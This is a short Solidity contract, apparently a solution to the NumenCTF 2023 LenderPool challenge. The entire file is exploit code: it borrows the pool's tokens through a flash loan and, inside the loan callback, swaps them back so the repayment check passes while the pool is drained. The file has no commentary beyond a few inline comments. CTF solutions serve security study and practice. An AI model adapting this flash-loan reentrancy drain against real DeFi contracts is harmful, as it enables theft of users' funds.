// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/NumenCTF_2023/LenderPool/LenderPool.sol";

contract LenderPoolAttack {
    ERC20 public token0;
    ERC20 public token1;
    LenderPool public lp;
    function attack(address target) public {
        lp = LenderPool(target);
        token0 = ERC20(address(lp.token0()));
        token1 = ERC20(address(lp.token1()));

        token0.approve(address(target), token0.balanceOf(address(lp)));
        token1.approve(address(target), token1.balanceOf(address(lp)));
        lp.flashLoan(token0.balanceOf(target), address(this));   // get token1
        lp.swap(address(token0), token0.balanceOf(address(lp)));  // token1 -> token0
    }

    function receiveEther(uint256 /*amount*/) public {
        lp.swap(address(token1), token1.balanceOf(address(lp)));  // token0 -> tokon1, repay meanwhile
    }

}
